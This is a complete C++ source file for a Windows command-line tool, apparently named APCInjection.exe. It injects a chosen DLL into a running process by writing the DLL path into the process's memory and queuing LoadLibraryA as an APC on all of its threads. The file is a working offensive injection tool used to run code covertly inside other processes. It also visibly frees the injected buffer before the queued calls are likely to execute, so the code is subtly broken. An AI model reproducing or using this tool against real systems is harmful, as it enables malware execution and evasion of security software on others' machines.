#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>
#include <vector>

using namespace std;

vector<DWORD> GetProcessThreads(DWORD pid) {
    vector<DWORD> tids;

    auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return tids;

    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tids.push_back(te.th32ThreadID);
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return tids;
}

DWORD GetPIDByName(const wchar_t* processName) {
    auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        cout << "[!]Usage: APCInjection.exe <processname> <dllpath>" << endl;
        return 1;
    }

    wchar_t processName[MAX_PATH];
    size_t chars;
    mbstowcs_s(&chars, processName, MAX_PATH, argv[1], _TRUNCATE);

    DWORD pid = GetPIDByName(processName);
    if (pid == 0) {
        cerr << "[-] Failed to find process" << endl;
        cout << "Error: " << GetLastError() << endl;
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
    if (hProcess == NULL) {
        cerr << "[-] Failed to open the process: " << GetLastError() << endl;
        return 1;
    }

    void* buffer = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (buffer == NULL) {
        cerr << "[-] Failed to allocate memory in the process: " << GetLastError() << endl;
        CloseHandle(hProcess);
        return 1;
    }

    LPCSTR lib = argv[2];
    if (!WriteProcessMemory(hProcess, buffer, lib, strlen(lib) + 1, nullptr)) {
        cerr << "[-] Failed to write to process memory: " << GetLastError() << endl;
        VirtualFreeEx(hProcess, buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    auto tids = GetProcessThreads(pid);
    if (tids.empty()) {
        cerr << "[-] Failed to locate threads in process " << pid << endl;
        VirtualFreeEx(hProcess, buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (hKernel32 == NULL) {
        cerr << "[-] Failed to get handle for kernel32.dll: " << GetLastError() << endl;
        VirtualFreeEx(hProcess, buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    FARPROC loadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    if (loadLibraryAddr == NULL) {
        cerr << "[-] Failed to get address of LoadLibraryA: " << GetLastError() << endl;
        VirtualFreeEx(hProcess, buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    for (const DWORD tid : tids) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
        if (hThread != nullptr) {
            if (QueueUserAPC((PAPCFUNC)loadLibraryAddr, hThread, (ULONG_PTR)buffer) == 0) {
                cerr << "[-] Failed to queue APC to thread " << tid << ": " << GetLastError() << endl;
            }
            CloseHandle(hThread);
        }
        else {
            cerr << "[-] Failed to open thread " << tid << ": " << GetLastError() << endl;
        }
    }

    cout << "[+] APC Queue Thread injected [+]" << endl;

    VirtualFreeEx(hProcess, buffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    cout << "<# PRESS Enter to exit>";
    getchar();

    return 0;
}
